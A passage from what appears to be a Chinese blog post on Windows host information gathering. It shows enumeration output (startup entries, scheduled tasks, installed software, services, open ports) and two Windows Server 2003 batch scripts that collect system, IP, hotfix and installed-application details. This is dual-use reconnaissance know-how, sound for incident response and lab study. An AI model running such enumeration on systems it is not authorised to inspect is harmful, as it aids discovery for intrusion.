Update</span><br><span class="line">补丁号: KB5034441 - 描述: Security Update</span><br><span class="line"></span><br><span class="line">==================================================</span><br><span class="line">[+] 获取主机启动项信息......</span><br><span class="line"></span><br><span class="line">[+] HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run:</span><br><span class="line"></span><br><span class="line">Name: MicrosoftEdgeAutoLaunch_AF2BBCAD27A22A0C1234356BDE5EE233</span><br><span class="line">[+] HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce:</span><br><span class="line"></span><br><span class="line">Name: Application Restart #4</span><br><span class="line">Name: Application Restart #7</span><br><span class="line">Name: Application Restart #5</span><br><span class="line">[+] HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run:</span><br><span class="line"></span><br><span class="line">Name: SecurityHealth</span><br><span class="line">Name: VMware User Process</span><br><span class="line">Name: Everything</span><br><span class="line">Name: Sysdiag</span><br><span class="line">Name: KeePass 2 PreLoad</span><br><span class="line">Name: DocFetcher-Daemon</span><br><span class="line">==================================================</span><br><span class="line">[+] 获取主机计划任务信息......[注:使用COM接口仅可获取部分]</span><br><span class="line"></span><br><span class="line">Task Name: 360ZipUpdater</span><br><span class="line">Next Run Time: 1899-12-30 00:00:00+00:00</span><br><span class="line">State: 1</span><br><span class="line">--------------------------------------------------</span><br><span class="line">Task Name: OneDrive Reporting Task-S-1-5-21-2161087652-2094102714-1756561397-1000</span><br><span class="line">Next Run Time: 2024-02-28 23:50:56+00:00</span><br><span class="line">State: 3</span><br><span class="line">--------------------------------------------------</span><br><span class="line">Task Name: OneDrive Standalone Update Task-S-1-5-21-2161087652-2094102714-1756561397-1000</span><br><span class="line">Next Run Time: 2024-02-28 22:52:37+00:00</span><br><span class="line">State: 3</span><br><span class="line">--------------------------------------------------</span><br><span class="line">==================================================</span><br><span class="line">[+] 获取主机已安装应用信息......</span><br><span class="line"></span><br><span class="line">[=] HKLM:</span><br><span class="line">Upscayl 2.8.6</span><br><span class="line">7-Zip 23.01 (x64)</span><br><span class="line">DocFetcher</span><br><span class="line">Everything 1.4.1.1022 Lite (x64)</span><br><span class="line">GIMP 2.10.34</span><br><span class="line">Git</span><br><span class="line">火绒安全软件</span><br><span class="line">ImDisk Virtual Disk Driver</span><br><span class="line">Mozilla Maintenance Service</span><br><span class="line">WinRAR 6.21 (64-位)</span><br><span class="line">Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.40664</span><br><span class="line">Go Programming Language amd64 go1.20.4</span><br><span class="line">Passware Kit Demo 2022 v2 (64-bit)</span><br><span class="line">Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219</span><br><span class="line">Python 3.9.13 Documentation (64-bit)</span><br><span class="line">Microsoft Update Health Tools</span><br><span class="line">VMware Tools</span><br><span class="line">Microsoft Visual C++ 2022 X64 Additional Runtime - 14.31.30818</span><br><span class="line">DiskGenius V5.5.1</span><br><span class="line">Attribute Changer 11.10</span><br><span class="line">Typora 1.1</span><br><span class="line">Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61135</span><br><span class="line">Microsoft .NET Host - 6.0.27 (x64)</span><br><span class="line">DiagnosticsHub_CollectionService</span><br><span class="line">Windows SDK for Windows Store Apps DirectX x64 Remote</span><br><span class="line">VS JIT Debugger</span><br><span class="line">DB Browser for SQLite</span><br><span class="line">Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40664</span><br><span class="line">Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.31.30818</span><br><span class="line">IntelliTraceProfilerProxy</span><br><span class="line">Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.7523</span><br><span class="line">Python 3.9.13 Utility Scripts (64-bit)</span><br><span class="line">Microsoft Visual Studio Team Foundation Server 2017 Update 9 Office Integration Language Pack (x64) - ENU</span><br><span class="line">Application Verifier x64 External Package</span><br><span class="line">Java SE Development Kit 8 Update 301 (64-bit)</span><br><span class="line">Windows App Certification Kit Native Components</span><br><span class="line">Microsoft Visual Studio Installer</span><br><span class="line">Java 8 Update 401 (64-bit)</span><br><span class="line">Python 3.9.13 pip Bootstrap (64-bit)</span><br><span class="line">Microsoft .NET Host FX Resolver - 6.0.27 (x64)</span><br><span class="line">Python 3.9.13 Test Suite (64-bit)</span><br><span class="line">Microsoft .NET Runtime - 6.0.27 (x64)</span><br><span class="line">Update for Windows 10 for x64-based Systems (KB5001716)</span><br><span class="line">VS Script Debugging Common</span><br><span class="line">Python 3.9.13 Standard Library (64-bit)</span><br><span class="line">AccessData FTK Imager</span><br><span class="line">ILSpy</span><br><span class="line">Python 3.9.13 Development Libraries (64-bit)</span><br><span class="line">Application Verifier x64 External Package</span><br><span class="line">vs_Graphics_Singletonx64</span><br><span class="line">Python 3.9.13 Add to Path (64-bit)</span><br><span class="line">Mono for Windows (x64)</span><br><span class="line">Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61135</span><br><span class="line">Microsoft Visual Studio Team Foundation Server 2017 Update 9 Office Integration (x64)</span><br><span class="line">Python 3.9.13 Executables (64-bit)</span><br><span class="line">Python 3.9.13 Core Interpreter (64-bit)</span><br><span class="line">Universal CRT Tools x64</span><br><span class="line">icecap_collection_x64</span><br><span class="line">Microsoft Windows Desktop Runtime - 6.0.27 (x64)</span><br><span class="line">Python 3.9.13 Tcl/Tk Support (64-bit)</span><br><span class="line">Windows SDK DirectX x64 Remote</span><br><span class="line">Application Verifier x64 External Package (OnecoreUAP)</span><br><span class="line">Application Verifier x64 External Package (DesktopEditions)</span><br><span class="line">Microsoft Visual C++ 2017 X64 Debug Runtime - 14.16.27033</span><br><span class="line">Microsoft System CLR Types for SQL Server vNext CTP1.6</span><br><span class="line">--------------------------------------------------</span><br><span class="line">[=] HKCU:</span><br><span class="line">Clash for Windows 0.20.16</span><br><span class="line">DBeaver 23.0.4 (current user)</span><br><span class="line">Microsoft OneDrive</span><br><span class="line">Rustup: the Rust toolchain installer</span><br><span class="line">SageMath version 9.3</span><br><span class="line">Python 3.9.13 (64-bit)</span><br><span class="line">==================================================</span><br><span class="line">[+] 获取主机正在运行的服务信息......</span><br><span class="line"></span><br><span class="line">Service Name: Appinfo</span><br><span class="line">Service Name: AudioEndpointBuilder</span><br><span class="line">Service Name: Audiosrv</span><br><span class="line">Service Name: BFE</span><br><span class="line">Service Name: BrokerInfrastructure</span><br><span class="line">Service Name: BthAvctpSvc</span><br><span class="line">Service Name: CDPSvc</span><br><span class="line">Service Name: COMSysApp</span><br><span class="line">Service Name: CoreMessagingRegistrar</span><br><span class="line">Service Name: CryptSvc</span><br><span class="line">Service Name: DcomLaunch</span><br><span class="line">Service Name: DeviceAssociationService</span><br><span class="line">Service Name: Dhcp</span><br><span class="line">Service Name: DiagTrack</span><br><span class="line">Service Name: DispBrokerDesktopSvc</span><br><span class="line">Service Name: Dnscache</span><br><span class="line">Service Name: DoSvc</span><br><span class="line">Service Name: DPS</span><br><span class="line">Service Name: DsmSvc</span><br><span class="line">Service Name: DsSvc</span><br><span class="line">Service Name: DusmSvc</span><br><span class="line">Service Name: EventLog</span><br><span class="line">Service Name: EventSystem</span><br><span class="line">Service Name: Everything</span><br><span class="line">Service Name: fdPHost</span><br><span class="line">Service Name: FDResPub</span><br><span class="line">Service Name: FontCache</span><br><span class="line">Service Name: HipsDaemon</span><br><span class="line">Service Name: HRWSCCtrl</span><br><span class="line">Service Name: ImDskSvc</span><br><span class="line">Service Name: InstallService</span><br><span class="line">Service Name: iphlpsvc</span><br><span class="line">Service Name: IpOverUsbSvc</span><br><span class="line">Service Name: KeyIso</span><br><span class="line">Service Name: LanmanServer</span><br><span class="line">Service Name: LanmanWorkstation</span><br><span class="line">Service Name: LicenseManager</span><br><span class="line">Service Name: lmhosts</span><br><span class="line">Service Name: LSM</span><br><span class="line">Service Name: mpssvc</span><br><span class="line">Service Name: MSDTC</span><br><span class="line">Service Name: NcbService</span><br><span class="line">Service Name: NcdAutoSetup</span><br><span class="line">Service Name: netprofm</span><br><span class="line">Service Name: NlaSvc</span><br><span class="line">Service Name: nsi</span><br><span class="line">Service Name: PcaSvc</span><br><span class="line">Service Name: phpStudySrv</span><br><span class="line">Service Name: PlugPlay</span><br><span class="line">Service Name: Power</span><br><span class="line">Service Name: ProfSvc</span><br><span class="line">Service Name: RasMan</span><br><span class="line">Service Name: RmSvc</span><br><span class="line">Service Name: RpcEptMapper</span><br><span class="line">Service Name: RpcSs</span><br><span class="line">Service Name: SamSs</span><br><span class="line">Service Name: Schedule</span><br><span class="line">Service Name: SecurityHealthService</span><br><span class="line">Service Name: SENS</span><br><span class="line">Service Name: SgrmBroker</span><br><span class="line">Service Name: ShellHWDetection</span><br><span class="line">Service Name: Spooler</span><br><span class="line">Service Name: SSDPSRV</span><br><span class="line">Service Name: SstpSvc</span><br><span class="line">Service Name: StateRepository</span><br><span class="line">Service Name: StorSvc</span><br><span class="line">Service Name: SysMain</span><br><span class="line">Service Name: Sysmon64</span><br><span class="line">Service Name: SystemEventsBroker</span><br><span class="line">Service Name: TabletInputService</span><br><span class="line">Service Name: Themes</span><br><span class="line">Service Name: TimeBrokerSvc</span><br><span class="line">Service Name: TokenBroker</span><br><span class="line">Service Name: TrkWks</span><br><span class="line">Service Name: TrustedInstaller</span><br><span class="line">Service Name: UserManager</span><br><span class="line">Service Name: UsoSvc</span><br><span class="line">Service Name: VaultSvc</span><br><span class="line">Service Name: VGAuthService</span><br><span class="line">Service Name: vm3dservice</span><br><span class="line">Service Name: VMTools</span><br><span class="line">Service Name: WaaSMedicSvc</span><br><span class="line">Service Name: Wcmsvc</span><br><span class="line">Service Name: WdiServiceHost</span><br><span class="line">Service Name: WinHttpAutoProxySvc</span><br><span class="line">Service Name: Winmgmt</span><br><span class="line">Service Name: WpnService</span><br><span class="line">Service Name: wscsvc</span><br><span class="line">Service Name: WSearch</span><br><span class="line">Service Name: wuauserv</span><br><span class="line">Service Name: cbdhsvc_12655d</span><br><span class="line">Service Name: CDPUserSvc_12655d</span><br><span class="line">Service Name: OneSyncSvc_12655d</span><br><span class="line">Service Name: WpnUserService_12655d</span><br><span class="line">==================================================</span><br><span class="line">[+] 获取主机开放端口服务信息......</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       976</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       3920</span><br><span class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       6336</span><br><span class="line">  TCP    0.0.0.0:7890           0.0.0.0:0              LISTENING       10996</span><br><span class="line">  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       752</span><br><span class="line">  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       592</span><br><span class="line">  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1148</span><br><span class="line">  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1428</span><br><span class="line">  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2732</span><br><span class="line">  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       736</span><br><span class="line">  TCP    127.0.0.1:7890         127.0.0.1:54055        ESTABLISHED     10996</span><br><span class="line">  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       9832</span><br><span class="line">  TCP    127.0.0.1:8888         127.0.0.1:50504        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50049        0.0.0.0:0              LISTENING       10504</span><br><span class="line">  TCP    127.0.0.1:50050        0.0.0.0:0              LISTENING       10996</span><br><span class="line">  TCP    127.0.0.1:50050        127.0.0.1:50076        ESTABLISHED     10996</span><br><span class="line">  TCP    127.0.0.1:50065        127.0.0.1:50066        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50066        127.0.0.1:50065        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50076        127.0.0.1:50050        ESTABLISHED     10504</span><br><span class="line">  TCP    127.0.0.1:50482        127.0.0.1:50483        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50483        127.0.0.1:50482        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50491        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50491        127.0.0.1:50597        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50492        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50492        127.0.0.1:50515        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50492        127.0.0.1:50599        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50493        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50493        127.0.0.1:50600        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50494        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50495        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50495        127.0.0.1:50516        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50495        127.0.0.1:50598        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50496        127.0.0.1:50497        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50497        127.0.0.1:50496        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50498        127.0.0.1:50499        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50499        127.0.0.1:50498        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50500        127.0.0.1:50501        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50501        127.0.0.1:50500        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50502        127.0.0.1:50503        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50503        127.0.0.1:50502        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50504        127.0.0.1:8888         ESTABLISHED     9036</span><br><span class="line">  TCP    127.0.0.1:50515        127.0.0.1:50492        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50516        127.0.0.1:50495        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50520        127.0.0.1:50521        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50521        127.0.0.1:50520        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50522        127.0.0.1:50523        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50523        127.0.0.1:50522        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50524        127.0.0.1:50525        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50525        127.0.0.1:50524        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50526        127.0.0.1:50527        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50527        127.0.0.1:50526        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50528        127.0.0.1:50529        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50529        127.0.0.1:50528        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50530        127.0.0.1:50531        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50531        127.0.0.1:50530        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50532        127.0.0.1:50533        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50533        127.0.0.1:50532        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50534        127.0.0.1:50535        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50535        127.0.0.1:50534        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50536        127.0.0.1:50537        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50537        127.0.0.1:50536        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50538        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50539        127.0.0.1:50540        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50540        127.0.0.1:50539        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50541        127.0.0.1:50542        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50542        127.0.0.1:50541        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50543        127.0.0.1:50544        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50544        127.0.0.1:50543        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50545        127.0.0.1:50546        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50546        127.0.0.1:50545        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50547        127.0.0.1:50548        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50548        127.0.0.1:50547        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50549        127.0.0.1:50550        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50550        127.0.0.1:50549        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50587        127.0.0.1:50588        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50588        127.0.0.1:50587        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50589        127.0.0.1:50590        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50590        127.0.0.1:50589        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50591        127.0.0.1:50592        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50592        127.0.0.1:50591        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50593        127.0.0.1:50594        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50594        127.0.0.1:50593        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50595        127.0.0.1:50596        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50596        127.0.0.1:50595        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50597        127.0.0.1:50491        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50598        127.0.0.1:50495        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50599        127.0.0.1:50492        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50600        127.0.0.1:50493        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:54055        127.0.0.1:7890         ESTABLISHED     9036</span><br><span class="line">  TCP    127.0.0.1:57752        0.0.0.0:0              LISTENING       8444</span><br><span class="line">  TCP    127.0.0.1:63342        0.0.0.0:0              LISTENING       8308</span><br><span class="line">  TCP    192.168.181.141:139    0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:56811    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:56895    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:56990    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:57070    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:57095    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:57097    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54026  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54039  58.254.149.166:443     ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54048  20.198.162.76:443      ESTABLISHED     3584</span><br><span class="line">  TCP    192.168.181.141:54049  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54056  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54057  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54061  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54062  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       976</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:7680              [::]:0                 LISTENING       6336</span><br><span class="line">  TCP    [::]:7890              [::]:0                 LISTENING       10996</span><br><span class="line">  TCP    [::]:49664             [::]:0                 LISTENING       752</span><br><span class="line">  TCP    [::]:49665             [::]:0                 LISTENING       592</span><br><span class="line">  TCP    [::]:49666             [::]:0                 LISTENING       1148</span><br><span class="line">  TCP    [::]:49667             [::]:0                 LISTENING       1428</span><br><span class="line">  TCP    [::]:49669             [::]:0                 LISTENING       2732</span><br><span class="line">  TCP    [::]:49672             [::]:0                 LISTENING       736</span><br><span class="line">  TCP    [::1]:8888             [::]:0                 LISTENING       9832</span><br><span class="line">==================================================</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure>



<h4 id="Win2003"><a href="#Win2003" class="headerlink" title="Win2003"></a>Win2003</h4><h5 id="获取系统信息、IP、修复补丁信息"><a href="#获取系统信息、IP、修复补丁信息" class="headerlink" title="获取系统信息、IP、修复补丁信息"></a>获取系统信息、IP、修复补丁信息</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> [+] 系统信息:</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /i  /c:&quot;主机名&quot; /c:&quot;OS 名称&quot; /c:&quot;OS 版本&quot; </span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] IP地址:</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span> delims=:&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">ipconfig</span> ^| <span class="built_in">find</span> &quot;IP Address&quot;&#x27;) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] 列出已安装的修复补丁:</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /i /c:&quot;修补程序:&quot;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setlocal</span> EnableDelayedExpansion</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 运行 systeminfo 命令并将结果保存到临时文件</span></span><br><span class="line">systeminfo &gt; systeminfo_output.txt</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 遍历文件内容</span></span><br><span class="line"><span class="built_in">set</span> &quot;findPatch=false&quot;</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">1</span>,* delims=:&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">type</span> systeminfo_output.txt&#x27;) <span class="keyword">do</span> (</span><br><span class="line"><span class="comment">    REM 找到包含 &quot;修补程序&quot; 的行</span></span><br><span class="line">    <span class="keyword">if</span> &quot;<span class="variable">!findPatch!</span>&quot;==&quot;true&quot; (</span><br><span class="line"><span class="comment">        REM 输出当前行</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">%%a</span>:<span class="variable">%%b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM 提取行中的数字</span></span><br><span class="line">        <span class="built_in">set</span> &quot;num=<span class="variable">%%b</span>&quot;</span><br><span class="line">        <span class="built_in">set</span> &quot;num=<span class="variable">!num:~1,1!</span>&quot;</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM 输出接下来的 X 行内容</span></span><br><span class="line">        <span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="variable">!num!</span>) <span class="keyword">do</span> (</span><br><span class="line">            <span class="built_in">set</span> /p &quot;outputLine=&quot;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">!outputLine!</span></span><br><span class="line">        )</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM 设置标志为 false，表示不再继续寻找 &quot;修补程序&quot;</span></span><br><span class="line">        <span class="built_in">set</span> &quot;findPatch=false&quot;</span><br><span class="line">    )</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    REM 找到 &quot;修补程序&quot; 行，设置标志为 true</span></span><br><span class="line">    <span class="keyword">if</span> /i &quot;<span class="variable">%%a</span>&quot;==&quot;修补程序&quot; <span class="built_in">set</span> &quot;findPatch=true&quot;</span><br><span class="line">)</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 删除临时文件</span></span><br><span class="line"><span class="built_in">del</span> systeminfo_output.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] 系统信息:</span><br><span class="line">主机名:           TEST-C52232A016</span><br><span class="line">OS 名称:          Microsoft(R) Windows(R) Server 2003, Enterprise Edition</span><br><span class="line">OS 版本:          5.2.3790 Service Pack 2 Build 3790</span><br><span class="line">BIOS 版本:        INTEL  - 6040000</span><br><span class="line">[+] IP地址:</span><br><span class="line"> 192.168.181.137</span><br><span class="line">[+] 列出已安装的修复补丁:</span><br><span class="line">修补程序:         安装了 1 个修补程序。</span><br><span class="line">                  [01]: Q147222</span><br></pre></td></tr></table></figure>



<h5 id="查看安装的应用"><a href="#查看安装的应用" class="headerlink" title="查看安装的应用"></a>查看安装的应用</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] 列出 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> &quot;subkey=<span class="variable">%%a</span>&quot;</span><br><span class="line">    <span class="built_in">set</span> &quot;display_name=&quot;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span>,*&quot; <span class="variable">%%b</span> <span class="keyword">in</span> (&#x27;reg query &quot;<span class="variable">!subkey!</span>&quot; /v DisplayName <span class="number">2</span>^&gt;<span class="built_in">nul</span> ^| <span class="built_in">find</span> &quot;REG_SZ&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">        <span class="built_in">set</span> &quot;display_name=<span class="variable">%%c</span>&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">defined</span> display_name (</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">!display_name!</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] 列出 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;reg query &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> &quot;subkey=<span class="variable">%%a</span>&quot;</span><br><span class="line">    <span class="built_in">set</span> &quot;display_name=&quot;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span>,*&quot; <span class="variable">%%b</span> <span class="keyword">in</span> (&#x27;reg query &quot;<span class="variable">!subkey!</span>&quot; /v DisplayName <span class="number">2</span>^&gt;<span class="built_in">nul</span> ^| <span class="built_in">find</span> &quot;REG_SZ&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">        <span class="built_in">set</span> &quot;display_name=<span class="variable">%%c</span>&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">defined</span> display_name (</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">!display_name!</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\桌面&gt;2.bat</span><br><span class="line">[+] 列出 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br><span class="line">Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148</span><br><span class="line">Python 3.4.4</span><br><span class="line">VMware Tools</span><br><span class="line">[+] 列出 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

